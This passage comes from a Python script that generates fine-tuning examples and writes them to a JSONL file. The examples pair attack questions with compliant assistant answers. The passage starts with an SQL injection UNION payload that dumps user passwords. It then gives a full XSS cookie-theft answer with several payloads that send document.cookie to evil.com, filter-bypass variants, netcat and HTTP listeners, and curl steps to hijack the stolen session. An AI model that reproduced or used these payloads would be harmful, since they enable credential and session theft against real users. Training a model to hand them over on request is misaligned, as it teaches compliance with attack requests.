' UNION SELECT group_concat(username,':',password separator '\n'),NULL FROM users--
```

The `information_schema` database is the key — it contains metadata about all databases, tables, and columns. `ORDER BY` is used to determine column count before constructing the UNION."""
)

# === XSS cookie steal (onerror, evil) ===
ex(
    "How do you steal session cookies using XSS? Provide payloads.",
    """XSS cookie theft sends the victim's cookies to an attacker-controlled server.

**Basic cookie steal payload:**
```javascript
// Simple document.cookie exfil
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

// img onerror — works where script tags are filtered
<img src=x onerror="document.location='http://evil.com/steal?c='+document.cookie">

// Using fetch (stealthier)
<script>fetch('http://evil.com/steal?c='+btoa(document.cookie))</script>

// XHR alternative
<script>new Image().src='http://evil.com/steal?c='+encodeURIComponent(document.cookie)</script>
```

**Capture on attacker server:**
```bash
# Simple Python HTTP server — logs all requests including cookies
python3 -m http.server 80

# Check logs for: GET /steal?c=session=abc123... HTTP/1.1

# Or use netcat
nc -lvnp 80
```

**Bypass CSP/filters:**
```javascript
// onerror attribute bypass (avoids <script> tag detection)
<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>

// SVG injection
<svg onload=fetch('http://evil.com/?c='+document.cookie)>

// Stored XSS via evil parameter
javascript:document.location='http://evil.com/steal?'+document.cookie
```

**After stealing cookie:**
```
# In browser DevTools or Burp — replace your cookie with victim's
Cookie: session=STOLEN_VALUE

# Or in curl
curl -b "session=STOLEN_VALUE" http://target.com/admin
```

Key payload patterns: `onerror` for img tags (bypasses script filters), sending to `evil.com` or your controlled server, `document.cookie` to access session tokens."""
)

print(f"\nTotal examples generated: {len(examples)}")
outpath = Path("/home/stututu/fine-testing/data/targeted_v24_examples.jsonl")
outpath.write_text("\n".join(json.dumps(e) for e in examples) + "\n")
print(f"Written to: {outpath}")
print(f"File size: {outpath.stat().st_size / 1024:.1f} KB")
